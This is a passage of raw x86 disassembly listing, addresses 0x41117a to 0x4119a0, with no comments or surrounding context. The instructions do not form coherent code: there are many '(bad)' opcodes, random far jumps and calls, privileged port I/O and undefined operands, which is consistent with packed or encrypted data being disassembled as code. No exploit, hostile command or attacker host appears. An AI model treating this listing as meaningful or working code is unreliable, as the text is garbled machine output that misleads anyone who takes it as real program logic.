  41117a:	or     eax,0x16af6960
  41117f:	add    cl,0xbd
  411182:	push   ecx
  411183:	sub    al,0x85
  411185:	loopne 0x411112
  411187:	xchg   esi,eax
  411188:	adc    DWORD PTR [edx-0x737a10cb],esi
  41118e:	dec    edx
  41118f:	lods   al,BYTE PTR ds:[esi]
  411190:	ret    
  411191:	in     eax,dx
  411192:	sub    BYTE PTR [esi+0x2a39e6f6],dl
  411198:	mov    WORD PTR ds:0x5d61d2e9,fs
  41119e:	jmp    0x1a060e75
  4111a3:	into   
  4111a4:	xchg   ecx,eax
  4111a5:	push   ecx
  4111a6:	cld    
  4111a7:	loope  0x411222
  4111a9:	xor    edx,DWORD PTR [ebx+0x33cc2a51]
  4111af:	jp     0x41120d
  4111b1:	or     BYTE PTR [ebx+0x2fef9a49],cl
  4111b7:	shl    BYTE PTR [ecx+eax*1-0x4525bfa0],cl
  4111be:	in     al,dx
  4111bf:	ds test ebp,eax
  4111c2:	add    al,BYTE PTR [ecx-0x138d276f]
  4111c8:	(bad)  
  4111c9:	(bad)  
  4111ca:	add    eax,0xf8a22f45
  4111cf:	stc    
  4111d0:	out    0xb3,al
  4111d2:	or     eax,DWORD PTR [edi+0x4c]
  4111d5:	push   0x29f7c5ae
  4111da:	jbe    0x4111d4
  4111dc:	cmp    al,0x16
  4111de:	sbb    ebx,DWORD PTR [ecx+ecx*8-0x60da0f]
  4111e5:	and    ch,BYTE PTR [ebx]
  4111e7:	mov    al,ds:0xb5a5817
  4111ec:	dec    edx
  4111ed:	pusha  
  4111ee:	jecxz  0x411174
  4111f0:	mov    esi,0xaf33174f
  4111f5:	bound  eax,QWORD PTR [edx-0x2a554edb]
  4111fb:	(bad)  [esi*4-0x557d2f48]
  411202:	std    
  411203:	gs mov ecx,0x5fbf388d
  411209:	cmp    ah,ah
  41120b:	dec    edi
  41120c:	jmp    0xa4d4:0x7a95e9d7
  411213:	and    eax,0x1ea43f67
  411218:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411219:	adc    BYTE PTR [eax+ecx*1-0x3c5a6696],cl
  411220:	call   0x434e6d8c
  411225:	adc    ch,BYTE PTR [ebx]
  411227:	repz (bad) 
  411229:	adc    BYTE PTR [ecx+0x13cb11dc],ah
  41122f:	jg     0x41128e
  411231:	cmp    eax,DWORD PTR [esi+edx*2]
  411234:	aas    
  411235:	imul   ecx,DWORD PTR [edi-0x3f],0x9a47ed0b
  41123c:	inc    ecx
  41123d:	or     eax,0x93fab7b6
  411242:	pop    edi
  411243:	mov    eax,0x69bccc23
  411248:	inc    ebx
  411249:	lds    ebx,FWORD PTR [eax]
  41124b:	data16 movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41124d:	icebp  
  41124e:	ret    
  41124f:	aaa    
  411250:	mov    ds:0xcb2660d5,eax
  411255:	lods   al,BYTE PTR ds:[esi]
  411256:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411257:	std    
  411258:	ret    
  411259:	icebp  
  41125a:	sbb    dh,BYTE PTR [ecx]
  41125c:	lock xchg BYTE PTR [esi],bh
  41125f:	sti    
  411260:	sbb    al,0x94
  411262:	test   al,0xb
  411264:	pop    eax
  411265:	cpuid  
  411267:	popa   
  411268:	pusha  
  411269:	xchg   DWORD PTR [edi],edi
  41126b:	and    DWORD PTR [ebx-0x6a],0xffffffc0
  41126f:	pop    ecx
  411270:	adc    BYTE PTR [ebx+0x6188129e],ch
  411276:	mov    DWORD PTR [ebp-0x1c],edi
  411279:	pushf  
  41127a:	dec    eax
  41127b:	xor    DWORD PTR [ecx],ebx
  41127d:	mul    BYTE PTR ds:0xac40aea5
  411283:	fisttp WORD PTR [ebx-0x51]
  411286:	dec    edx
  411287:	xor    BYTE PTR [edi],bh
  411289:	repnz xchg ecx,eax
  41128b:	push   cs
  41128c:	mov    DWORD PTR [ecx+0x50],esi
  41128f:	pop    edi
  411290:	jg     0x411299
  411292:	xchg   ebx,eax
  411293:	outs   dx,BYTE PTR ds:[esi]
  411294:	(bad)  
  411295:	jmp    0x4112b5
  411297:	mov    al,0xd
  411299:	inc    BYTE PTR [ebx]
  41129b:	stos   BYTE PTR es:[edi],al
  41129c:	dec    esi
  41129d:	sub    ebp,DWORD PTR ds:0x5dd8f53f
  4112a3:	icebp  
  4112a4:	fwait
  4112a5:	mov    dh,0x9f
  4112a7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4112a8:	xchg   esp,eax
  4112a9:	mov    ebp,0x92b365f
  4112ae:	xchg   esp,eax
  4112af:	mov    bh,0x43
  4112b1:	jnp    0x411277
  4112b3:	(bad)  
  4112b4:	fdivr  st(4),st
  4112b6:	mov    ds:0x8a8ce473,eax
  4112bb:	ins    BYTE PTR es:[edi],dx
  4112bc:	(bad)  
  4112bd:	aam    0xa9
  4112bf:	cmp    BYTE PTR [ebx+0x5f],ch
  4112c2:	adc    al,0x24
  4112c4:	fiadd  WORD PTR [esi-0x153ba98b]
  4112ca:	or     al,0xa0
  4112cc:	jge    0x41134a
  4112ce:	push   0xa0d0cbb
  4112d3:	mov    edx,0xe316900a
  4112d8:	fild   DWORD PTR [ebp+0x48]
  4112db:	fnsave [esp+ebx*4-0x1a]
  4112df:	repz clc 
  4112e1:	push   ebx
  4112e2:	sub    edi,DWORD PTR ds:0xf5ac926b
  4112e8:	pop    ebx
  4112e9:	cli    
  4112ea:	mov    ecx,0x65d03cd2
  4112ef:	jae    0x411334
  4112f1:	test   bh,al
  4112f3:	ret    0x48be
  4112f6:	pop    ebx
  4112f7:	aam    0x1
  4112f9:	ins    DWORD PTR es:[edi],dx
  4112fa:	imul   esp,DWORD PTR [ebx+0x4d],0xf0cf0dd7
  411301:	aaa    
  411302:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411303:	imul   ebp,DWORD PTR [edi-0x42a7de33],0x13519766
  41130d:	cli    
  41130e:	iret   
  41130f:	inc    ecx
  411310:	mov    al,0x55
  411312:	out    dx,al
  411313:	mov    esp,0x3095d4a6
  411318:	(bad)  
  411319:	push   es
  41131a:	cwde   
  41131b:	mov    dh,0x67
  41131d:	sti    
  41131e:	outs   dx,BYTE PTR ds:[esi]
  41131f:	push   ebx
  411320:	icebp  
  411321:	adc    eax,0x45720f26
  411326:	mov    ds:0x187bdfa1,al
  41132b:	cmp    edi,esi
  41132d:	cmp    DWORD PTR [edi],0xffffff9b
  411330:	mov    bh,0xc4
  411332:	jo     0x4112c2
  411334:	mov    edx,0xcfa58aaf
  411339:	or     esi,ebx
  41133b:	adc    dl,BYTE PTR ds:0xb266c49b
  411341:	or     al,0xa9
  411343:	adc    eax,0xa4a784bb
  411348:	xchg   esp,eax
  411349:	cmp    BYTE PTR [edx],dh
  41134b:	jo     0x411310
  41134d:	std    
  41134e:	repnz int3 
  411350:	inc    edi
  411351:	pop    eax
  411352:	test   al,0xf5
  411354:	adc    DWORD PTR [esi-0x247ea544],0xb18d79f2
  41135e:	loope  0x41135c
  411360:	fimul  WORD PTR [ecx-0x20]
  411363:	lahf   
  411364:	mov    WORD PTR [edi],fs
  411366:	fsubp  st(0),st
  411368:	adc    cl,dh
  41136a:	dec    ecx
  41136b:	inc    edi
  41136c:	in     eax,0x98
  41136e:	(bad)  
  41136f:	mov    al,0xbe
  411371:	mov    dx,bx
  411374:	cmp    BYTE PTR [eax],bh
  411376:	rol    DWORD PTR [ebp-0x67],1
  411379:	lock movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41137b:	(bad)  
  41137c:	dec    esp
  41137d:	jmp    0xd9e9:0xa8501ded
  411384:	mov    dl,0xbc
  411386:	aaa    
  411387:	lods   eax,DWORD PTR ds:[esi]
  411388:	adc    al,0x5a
  41138a:	gs stc 
  41138c:	adc    cl,dl
  41138e:	add    BYTE PTR [edx],ah
  411390:	xor    al,0x84
  411392:	into   
  411393:	jecxz  0x411330
  411395:	push   edx
  411396:	cs sbb eax,0xaea19bd0
  41139c:	loop   0x411373
  41139e:	or     al,0x42
  4113a0:	inc    eax
  4113a1:	sub    bl,ah
  4113a3:	push   0x9ff0c956
  4113a8:	adc    bh,BYTE PTR [edx-0x868a87c]
  4113ae:	adc    DWORD PTR [eax-0x90392e3],0x4bd23d3b
  4113b8:	jg     0x4113f7
  4113ba:	fmul   DWORD PTR [ebp+edi*2+0x3d]
  4113be:	jl     0x4113dc
  4113c0:	mov    bl,0x95
  4113c2:	push   0x11
  4113c4:	loopne 0x4113af
  4113c6:	xchg   ecx,eax
  4113c7:	cmp    al,0xdc
  4113c9:	(bad)  
  4113ca:	inc    esi
  4113cb:	daa    
  4113cc:	adc    edx,DWORD PTR [ecx-0x254770ad]
  4113d2:	jp     0x411389
  4113d4:	push   edx
  4113d5:	sub    eax,0xdf9aee1f
  4113da:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4113db:	(bad)  
  4113dc:	call   0xf4b5:0xcf14b90b
  4113e3:	rcr    BYTE PTR [edx-0x3d],1
  4113e6:	and    cl,BYTE PTR [ebx-0x240b57d1]
  4113ec:	cld    
  4113ed:	adc    BYTE PTR [esi+eax*8-0x7c],0xcb
  4113f2:	leave  
  4113f3:	div    BYTE PTR [ecx+edx*4+0x6accb79f]
  4113fa:	lds    esi,FWORD PTR [ecx-0x6fab1cb5]
  411400:	mov    ?,WORD PTR [ebp-0xa]
  411403:	xor    ebp,ecx
  411405:	or     al,0xa9
  411407:	lods   eax,DWORD PTR ds:[esi]
  411408:	add    ah,bl
  41140a:	dec    edx
  41140b:	pop    ds
  41140c:	aad    0xf5
  41140e:	call   0xb358:0x142b63ce
  411415:	or     bh,0x38
  411418:	adc    BYTE PTR [esi+eax*4+0x7413e978],al
  41141f:	ss scas al,BYTE PTR es:[edi]
  411421:	cmp    DWORD PTR [edi],ebp
  411423:	in     eax,dx
  411424:	or     dh,BYTE PTR [edx]
  411426:	mov    ecx,0x31886d9
  41142b:	fmul   QWORD PTR [ebx-0x5c]
  41142e:	in     eax,dx
  41142f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411430:	out    0xac,eax
  411432:	(bad)  
  411433:	mov    ebx,0x2e0387de
  411438:	fadd   st,st(5)
  41143a:	xor    eax,ebp
  41143c:	pop    ds
  41143d:	(bad)  
  41143e:	fld    TBYTE PTR [ebp+0x1892fd20]
  411444:	cmp    al,BYTE PTR [esi]
  411446:	dec    esp
  411447:	inc    edi
  411448:	cld    
  411449:	xor    al,0x4
  41144b:	add    DWORD PTR [edi+eiz*2-0x3],0xfffffff8
  411450:	jmp    0x31b1a47
  411455:	push   esp
  411456:	inc    esp
  411457:	sbb    BYTE PTR [ecx+0x56],0x13
  41145b:	lods   eax,DWORD PTR ds:[esi]
  41145c:	fcmovb st,st(7)
  41145e:	pop    edi
  41145f:	jmp    0x10bc:0x3f8a34aa
  411466:	jbe    0x411476
  411468:	push   edx
  411469:	nop
  41146a:	jle    0x4114e8
  41146c:	out    dx,al
  41146d:	jno    0x41146f
  41146f:	lds    esi,FWORD PTR [edi]
  411471:	dec    esi
  411472:	and    al,0xae
  411474:	sub    al,0xa4
  411476:	pop    ebp
  411477:	mov    dh,0x67
  411479:	mov    edi,0x85cb71c3
  41147e:	inc    ebx
  41147f:	sar    ebx,0x77
  411482:	sbb    edi,DWORD PTR ds:0x26a261d1
  411488:	ss je  0x41144f
  41148b:	lock dec esi
  41148d:	xchg   edi,eax
  41148e:	push   cs
  41148f:	pusha  
  411490:	xlat   BYTE PTR ds:[ebx]
  411491:	xchg   ebx,eax
  411492:	dec    eax
  411493:	push   ecx
  411494:	fistp  QWORD PTR [esi-0x60da2ab7]
  41149a:	and    eax,esi
  41149c:	(bad)  
  41149d:	adc    DWORD PTR [ebx+0x3b],edi
  4114a0:	leave  
  4114a1:	jl     0x4114cb
  4114a3:	(bad)  
  4114a4:	pusha  
  4114a5:	xlat   BYTE PTR ds:[ebx]
  4114a6:	mov    WORD PTR [eax-0x5e],es
  4114a9:	dec    ebx
  4114aa:	add    eax,0xd4dcebb5
  4114af:	push   ecx
  4114b0:	loop   0x4114ff
  4114b2:	in     al,dx
  4114b3:	and    al,0xcd
  4114b5:	sub    BYTE PTR [ebp-0x70],0x5f
  4114b9:	cmp    bh,BYTE PTR [ebx]
  4114bb:	mov    ch,ch
  4114bd:	repz jbe 0x411492
  4114c0:	lahf   
  4114c1:	pop    edi
  4114c2:	clc    
  4114c3:	inc    esi
  4114c4:	jne    0x41145f
  4114c6:	sub    BYTE PTR [edi],bh
  4114c8:	imul   DWORD PTR cs:[edx]
  4114cb:	aad    0x5b
  4114cd:	gs ret 
  4114cf:	stos   BYTE PTR es:[edi],al
  4114d0:	mov    dh,0xff
  4114d2:	jl     0x4114f4
  4114d4:	add    al,0x5f
  4114d6:	retf   0xd71a
  4114d9:	imul   ecx
  4114db:	vshufps ymm3,ymm4,ymm2,0x5c
  4114e0:	lock faddp st(5),st
  4114e3:	push   edi
  4114e4:	dec    ebx
  4114e5:	add    BYTE PTR [ecx],al
  4114e7:	xchg   edx,eax
  4114e8:	push   esi
  4114e9:	adc    BYTE PTR [si],dl
  4114ec:	fs xchg esp,eax
  4114ee:	ss ins BYTE PTR es:[edi],dx
  4114f0:	push   cs
  4114f1:	call   0xe168:0x1cc9426b
  4114f8:	mov    eax,ds:0xabdf0977
  4114fd:	adc    DWORD PTR [ebp+0x544ab2b],eax
  411503:	mov    edi,0x2e9f7cdd
  411508:	xor    eax,0xb0f20528
  41150d:	sbb    edx,DWORD PTR [edx-0x1c]
  411510:	in     al,dx
  411511:	int    0xd9
  411513:	mov    edx,0x54e2f662
  411518:	fs xchg ebx,eax
  41151a:	and    esp,DWORD PTR [ebx]
  41151c:	inc    ebp
  41151d:	push   DWORD PTR [ecx-0x78]
  411520:	xchg   BYTE PTR [esi-0x5e5b81af],dl
  411526:	fst    QWORD PTR [edi]
  411528:	jne    0x411554
  41152a:	mov    edi,ebx
  41152c:	mov    ds:0x64bf610,al
  411531:	fcomip st,st(3)
  411533:	mov    DWORD PTR [ebp+0x39f4617a],eax
  411539:	arpl   WORD PTR [edi-0x7bd28703],bp
  41153f:	fnsave [ebp+0x2a529dd5]
  411545:	pop    ecx
  411546:	push   esp
  411547:	or     DWORD PTR [edx-0x21],ecx
  41154a:	ins    BYTE PTR es:[edi],dx
  41154b:	xchg   edx,eax
  41154c:	push   ds
  41154d:	setbe  ch
  411550:	outs   dx,DWORD PTR ds:[esi]
  411551:	dec    esp
  411552:	shl    DWORD PTR [esi+edi*1-0x2eaee0b4],cl
  411559:	add    ecx,DWORD PTR [edi-0x525ab747]
  41155f:	push   0x33
  411561:	push   ebp
  411562:	sbb    eax,0x7111f020
  411567:	lods   eax,DWORD PTR ds:[esi]
  411568:	retf   0x542f
  41156b:	(bad)  
  41156c:	out    0x3,eax
  41156e:	jb     0x411504
  411570:	mov    bh,BYTE PTR [esi]
  411572:	cld    
  411573:	pop    esp
  411574:	push   edi
  411575:	retf   0xf4e0
  411578:	pop    ebx
  411579:	aam    0x3e
  41157b:	es leave 
  41157d:	mov    esp,fs
  41157f:	cmp    al,0xfb
  411581:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411582:	push   ebx
  411583:	mov    cl,0x93
  411585:	pop    ebx
  411586:	mov    ah,0x77
  411588:	pop    edi
  411589:	xor    dh,BYTE PTR [ecx-0x330459ae]
  41158f:	cmp    bh,bl
  411591:	mov    al,ds:0xe4cb55e2
  411596:	cld    
  411597:	dec    ebx
  411598:	mov    ebp,0xfbb60736
  41159d:	push   eax
  41159e:	test   DWORD PTR [edx+0x21],ecx
  4115a1:	or     eax,ebp
  4115a3:	jne    0x4115dc
  4115a5:	(bad)  
  4115a6:	aam    0x4b
  4115a8:	leave  
  4115a9:	outs   dx,BYTE PTR ds:[esi]
  4115aa:	cmp    ecx,DWORD PTR [ebx-0x19062739]
  4115b0:	sub    ebx,DWORD PTR [edi-0x4a]
  4115b3:	and    BYTE PTR [edx],0xa3
  4115b6:	sbb    DWORD PTR [eax-0x4c],edx
  4115b9:	adc    DWORD PTR [edi],ecx
  4115bb:	dec    ecx
  4115bc:	mov    al,ds:0x4085070
  4115c1:	jb     0x411599
  4115c3:	ins    BYTE PTR es:[edi],dx
  4115c4:	xchg   edx,eax
  4115c5:	ror    dl,cl
  4115c7:	inc    ecx
  4115c8:	or     eax,0xa49c74b1
  4115cd:	aas    
  4115ce:	lds    ebx,FWORD PTR [esi-0x1e]
  4115d1:	xor    ebp,DWORD PTR [esi]
  4115d3:	loop   0x41164d
  4115d5:	sbb    bh,BYTE PTR [edi-0xd2fafef]
  4115db:	pop    esp
  4115dc:	mov    esi,0xd4abea32
  4115e1:	pop    es
  4115e2:	daa    
  4115e3:	push   esp
  4115e4:	shl    BYTE PTR [ecx-0x2d],1
  4115e7:	push   es
  4115e8:	into   
  4115e9:	into   
  4115ea:	jmp    0x5a0294b7
  4115ef:	push   eax
  4115f0:	(bad)  
  4115f1:	sub    eax,0x5f5220bb
  4115f6:	fdivrp st(7),st
  4115f8:	mov    esp,0x153b841d
  4115fd:	mov    eax,ds:0x4a8985c6
  411602:	add    al,0x5
  411604:	mov    bh,0x75
  411606:	add    BYTE PTR [ecx+0x5d],ah
  411609:	repz xor dh,BYTE PTR [ebp+0x14]
  41160d:	mov    eax,ds:0xfffc002c
  411612:	mov    eax,0xb3abf78f
  411617:	shl    DWORD PTR [edi],0x62
  41161a:	cmp    DWORD PTR [ecx],0xffffffc1
  41161d:	pop    ebx
  41161e:	mov    ah,0x8d
  411620:	dec    eax
  411621:	(bad)  
  411622:	jmp    0x9b14:0x2151945a
  411629:	cmp    bl,ah
  41162b:	adc    al,0xde
  41162d:	cmc    
  41162e:	sti    
  41162f:	add    DWORD PTR [eax-0x37],eax
  411632:	test   BYTE PTR [edx-0x3f4da187],al
  411638:	fdiv   st(3),st
  41163a:	popa   
  41163b:	adc    BYTE PTR [ebx],al
  41163d:	ret    
  41163e:	test   DWORD PTR [ecx+0x67e07a32],eax
  411644:	lds    esp,FWORD PTR [esi+0x55]
  411647:	push   ebx
  411648:	push   ebp
  411649:	add    esi,DWORD PTR [ecx+eax*2]
  41164c:	inc    edx
  41164d:	mov    ds:0xb0d83702,al
  411652:	push   ebp
  411653:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411654:	js     0x411629
  411656:	add    al,0xb5
  411658:	mov    eax,ds:0xbe27dff6
  41165d:	call   0x2b1e:0x2446749d
  411664:	pop    esi
  411665:	sub    BYTE PTR [edi+ebp*1-0x68],bl
  411669:	push   ebp
  41166a:	daa    
  41166b:	inc    edx
  41166c:	outs   dx,BYTE PTR ds:[esi]
  41166d:	pop    ebp
  41166e:	sub    DWORD PTR [ebx+0x60c89a3f],ebp
  411674:	lock inc ebp
  411676:	fisubr DWORD PTR [edi-0x99e723f]
  41167c:	call   0xcb6866c5
  411681:	in     al,dx
  411682:	jmp    0xb27e:0xc56714a6
  411689:	outs   dx,DWORD PTR ds:[esi]
  41168a:	add    eax,0x9d93a6de
  41168f:	ror    DWORD PTR [ebx+0x4bc2d0a9],1
  411695:	imul   esi,DWORD PTR [eax+0x2a],0x2f
  411699:	jle    0x41164d
  41169b:	adc    BYTE PTR [esi+0x41],0x1
  41169f:	jno    0x411634
  4116a1:	xchg   edi,eax
  4116a2:	xlat   BYTE PTR ds:[ebx]
  4116a3:	int3   
  4116a4:	mov    dl,0xe
  4116a6:	sub    bh,BYTE PTR [edi]
  4116a8:	jmp    0x41165c
  4116aa:	or     bh,ch
  4116ac:	or     al,0x58
  4116ae:	push   0x6e9db76
  4116b3:	aaa    
  4116b4:	xchg   DWORD PTR [eax],eax
  4116b6:	push   edi
  4116b7:	dec    eax
  4116b8:	std    
  4116b9:	(bad)  
  4116ba:	mov    dl,0xc6
  4116bc:	xchg   edx,eax
  4116bd:	out    dx,al
  4116be:	out    dx,eax
  4116bf:	jecxz  0x4116fc
  4116c1:	sbb    bl,dl
  4116c3:	adc    ah,BYTE PTR [edx-0x6024f4d6]
  4116c9:	jg     0x411733
  4116cb:	ss js  0x411723
  4116ce:	push   esp
  4116cf:	popa   
  4116d0:	cmp    eax,0x9c407a93
  4116d5:	aaa    
  4116d6:	fild   WORD PTR [ecx+0x5bda14e3]
  4116dc:	mov    ds:0x67205d85,eax
  4116e1:	cmp    edx,edi
  4116e3:	test   eax,0xe0b46982
  4116e8:	bound  eax,QWORD PTR [ecx-0x161521d5]
  4116ee:	mov    ebx,0x22596188
  4116f3:	push   eax
  4116f4:	and    DWORD PTR [eax+ebp*8+0x4a68072f],ebp
  4116fb:	sbb    eax,0xd280a3be
  411700:	sti    
  411701:	pusha  
  411702:	or     ebp,DWORD PTR ds:0x27965406
  411708:	dec    esp
  411709:	ja     0x411738
  41170b:	aas    
  41170c:	adc    cl,BYTE PTR ds:0x43f2e71c
  411712:	fist   DWORD PTR [ecx-0x69]
  411715:	push   ss
  411716:	xchg   esi,eax
  411717:	ret    
  411718:	jb     0x411717
  41171a:	lock add al,0x27
  41171d:	jb     0x411702
  41171f:	xor    eax,0xc8103085
  411724:	ss pop ds
  411726:	mov    ah,0x55
  411728:	aas    
  411729:	out    0x2c,al
  41172b:	jae    0x411754
  41172d:	(bad)  
  41172e:	ror    BYTE PTR [eax],0xcd
  411731:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411732:	pop    edi
  411733:	jp     0x4117b4
  411735:	jle    0x4117b3
  411737:	aaa    
  411738:	cmp    ebp,edx
  41173a:	mov    ecx,0xc9a0d4a9
  41173f:	push   ebp
  411740:	ja     0x41178f
  411742:	out    0x54,eax
  411744:	dec    eax
  411745:	popf   
  411746:	call   0x8cbb2da6
  41174b:	sub    edx,DWORD PTR [edi+0x22]
  41174e:	sar    BYTE PTR [edx+eiz*1-0x3986b57c],cl
  411755:	inc    edx
  411756:	rcr    DWORD PTR [edi],1
  411758:	loope  0x4117c8
  41175a:	dec    ecx
  41175b:	xor    esp,DWORD PTR [esi]
  41175d:	pop    edx
  41175e:	push   esp
  41175f:	jo     0x411761
  411761:	mov    ch,0x1c
  411763:	dec    edi
  411764:	xor    DWORD PTR [ecx],edi
  411766:	sub    BYTE PTR [ebp-0x4a9eb28b],0xb4
  41176d:	(bad)  
  41176e:	mov    ecx,0xf5b64193
  411773:	hlt    
  411774:	jb     0x41173e
  411776:	dec    edi
  411777:	loopne 0x41174d
  411779:	sbb    eax,0x8f4a750b
  41177e:	imul   esi,DWORD PTR [ebp-0x6b9588a1],0xa3b090b
  411788:	retf   
  411789:	test   ch,0xdb
  41178c:	mov    ebx,0xf8ed8c2f
  411791:	int3   
  411792:	std    
  411793:	(bad)  
  411794:	inc    eax
  411795:	retf   0x9b72
  411798:	cmc    
  411799:	mov    dh,0x5d
  41179b:	iret   
  41179c:	imul   BYTE PTR [eax]
  41179e:	push   0x2
  4117a0:	mov    al,0xc6
  4117a2:	popa   
  4117a3:	stc    
  4117a4:	loope  0x4117ac
  4117a6:	or     al,0xb6
  4117a8:	cmp    DWORD PTR [eax-0x4b4f4ce2],esi
  4117ae:	in     eax,dx
  4117af:	out    0xc,eax
  4117b1:	in     eax,dx
  4117b2:	xor    cl,BYTE PTR [esi-0x6b82596a]
  4117b8:	or     DWORD PTR ds:0x2f75e865,ecx
  4117be:	xor    dh,ah
  4117c0:	(bad)  
  4117c1:	stc    
  4117c2:	inc    esi
  4117c3:	scas   eax,DWORD PTR es:[edi]
  4117c4:	xor    BYTE PTR [esi],dl
  4117c6:	xor    eax,0x696ffe63
  4117cb:	enter  0x1fd9,0xa3
  4117cf:	adc    eax,0x1c41b0ff
  4117d4:	pmuludq mm4,QWORD PTR ds:0x9039dc84
  4117db:	xchg   edx,eax
  4117dc:	adc    BYTE PTR [ecx+0x48],cl
  4117df:	adc    ebx,DWORD PTR [eax]
  4117e1:	or     eax,0xf9700c19
  4117e6:	dec    eax
  4117e7:	jbe    0x4117a3
  4117e9:	or     ebp,edi
  4117eb:	and    ch,BYTE PTR [esi*1+0x2c11cffd]
  4117f2:	mov    fs,WORD PTR [ebp-0x6a]
  4117f5:	das    
  4117f6:	aad    0x9f
  4117f8:	sbb    BYTE PTR [eax+0x3],dl
  4117fb:	xor    ecx,DWORD PTR [eax-0x3d]
  4117fe:	xchg   edi,eax
  4117ff:	mov    DWORD PTR [eax+0x3a],edx
  411802:	ret    
  411803:	loopne 0x4117fe
  411805:	pop    edx
  411806:	in     eax,dx
  411807:	mov    al,0xc3
  411809:	js     0x411843
  41180b:	retf   0xbbdb
  41180e:	fiadd  DWORD PTR [ecx+0x1a]
  411811:	mov    ecx,DWORD PTR [esp+ebx*1-0x39db27d2]
  411818:	mov    ds:0x455aba51,al
  41181d:	or     BYTE PTR [ebx-0x16],al
  411820:	sub    eax,0x740c664c
  411825:	and    al,0xc1
  411827:	call   0xad8a:0x1d091d42
  41182e:	(bad)  
  41182f:	cwde   
  411830:	cmp    eax,0xeff60fb7
  411835:	xor    al,0xcf
  411837:	xor    dl,BYTE PTR [edx+0x24]
  41183a:	push   edi
  41183b:	pop    ss
  41183c:	nop
  41183d:	arpl   WORD PTR [ecx+0xc04ac7],si
  411843:	cmp    dh,BYTE PTR [esp+eax*8]
  411846:	ja     0x4117cf
  411848:	int3   
  411849:	call   0x2047:0xc3c50169
  411850:	repz out 0xde,eax
  411853:	and    eax,0xa32bac36
  411858:	ficom  DWORD PTR [ecx]
  41185a:	leave  
  41185b:	mov    edi,0x5e44441b
  411860:	add    DWORD PTR [esi+0x52],esp
  411863:	leave  
  411864:	xor    al,0xdd
  411866:	cwde   
  411867:	out    0xb1,eax
  411869:	push   edi
  41186a:	jp     0x4117f1
  41186c:	fadd   QWORD PTR [ecx+0x6996417]
  411872:	pop    es
  411873:	mov    WORD PTR [edx+0x6980941f],?
  411879:	inc    ebp
  41187a:	and    ah,BYTE PTR ds:0x32c1e1b0
  411880:	or     esp,DWORD PTR [ecx]
  411882:	cmp    al,0xc
  411884:	xor    al,0x46
  411886:	retf   0xe768
  411889:	enter  0x2e5,0x14
  41188d:	scas   al,BYTE PTR es:[edi]
  41188e:	or     eax,0xc334517
  411893:	call   0xa545b7fa
  411898:	pop    ebx
  411899:	or     eax,DWORD PTR [ecx]
  41189b:	test   eax,0x2c22b337
  4118a0:	enter  0xa26f,0xd9
  4118a4:	addr16 dec esi
  4118a6:	in     al,0xb
  4118a8:	pop    ebp
  4118a9:	into   
  4118aa:	and    al,0xed
  4118ac:	mov    dh,0x36
  4118ae:	call   0xa1af37da
  4118b3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4118b4:	fisubr WORD PTR [eax]
  4118b6:	int    0x24
  4118b8:	push   bp
  4118ba:	ret    0xdeeb
  4118bd:	sti    
  4118be:	test   eax,0x45d2b121
  4118c3:	sar    BYTE PTR ds:0xc19ce770,0xfa
  4118ca:	repz adc BYTE PTR [edx+0x209af351],bh
  4118d1:	arpl   WORD PTR [esp+ebp*4+0x43f0fdab],sp
  4118d8:	mov    ebp,0x9e8aedcb
  4118dd:	mov    eax,ds:0x844de45a
  4118e2:	push   0xca65a547
  4118e7:	or     DWORD PTR [esp+eiz*2+0x2d],esp
  4118eb:	jns    0x4118f1
  4118ed:	mov    edx,0x856f761f
  4118f2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4118f3:	neg    BYTE PTR [ebx+0x62433b36]
  4118f9:	scas   al,BYTE PTR es:[edi]
  4118fa:	cmp    ch,dl
  4118fc:	popa   
  4118fd:	ins    DWORD PTR es:[edi],dx
  4118fe:	pop    eax
  4118ff:	mov    ds:0x17285814,eax
  411904:	popa   
  411905:	aas    
  411906:	jbe    0x411888
  411908:	loopne 0x4118d0
  41190a:	sbb    DWORD PTR [edi],ecx
  41190c:	mov    ds:0xc5477f0c,al
  411911:	test   BYTE PTR [edx+ecx*8-0x29d136b0],cl
  411918:	xor    DWORD PTR [ecx-0x75568ddf],edi
  41191e:	sub    eax,0x2cf40075
  411923:	ret    0xcaad
  411926:	call   0xc312:0x1ac7a9b4
  41192d:	jmp    0xdb1a:0x898fe17a
  411934:	into   
  411935:	inc    eax
  411936:	jg     0x41194b
  411938:	frstor [edi]
  41193a:	(bad)  
  41193b:	dec    edi
  41193c:	es xchg ebx,eax
  41193e:	loopne 0x411934
  411940:	(bad)  
  411942:	sti    
  411943:	pop    ebp
  411944:	retf   
  411945:	xchg   edi,eax
  411946:	jno    0x4118da
  411948:	scas   al,BYTE PTR es:[edi]
  411949:	cmp    bh,BYTE PTR [eax+0x2ee34df8]
  41194f:	lock ds inc esp
  411952:	xchg   esp,eax
  411953:	call   0x94a8b924
  411958:	mov    ds:0xb38720b6,al
  41195d:	sahf   
  41195e:	cwde   
  41195f:	es stos DWORD PTR es:[edi],eax
  411961:	fcmovb st,st(5)
  411963:	pusha  
  411964:	adc    eax,0xe7ccca34
  411969:	retf   0xc3f
  41196c:	sub    cl,BYTE PTR [eax+0x74]
  41196f:	mov    ds,WORD PTR [ebp-0xf]
  411972:	aaa    
  411973:	xchg   esp,eax
  411974:	inc    esi
  411975:	mov    edi,0x5ea15734
  41197a:	cmp    dh,BYTE PTR ds:0xe3af7f3b
  411980:	mov    es,WORD PTR [ebp-0x7a]
  411983:	xlat   BYTE PTR ds:[ebx]
  411984:	xlat   BYTE PTR ds:[ebx]
  411985:	fld    QWORD PTR [edx+0x7a726292]
  41198b:	push   ecx
  41198c:	mov    cl,0xc5
  41198f:	retf   0x7475
  411992:	push   edx
  411993:	cmp    bl,BYTE PTR [ebp+0x4a]
  411996:	sub    ch,dh
  411998:	pop    ecx
  411999:	mov    esp,0x2d098db7
  41199e:	or     dh,dl
  4119a0:	sbb    ch,BYTE PTR [esi]
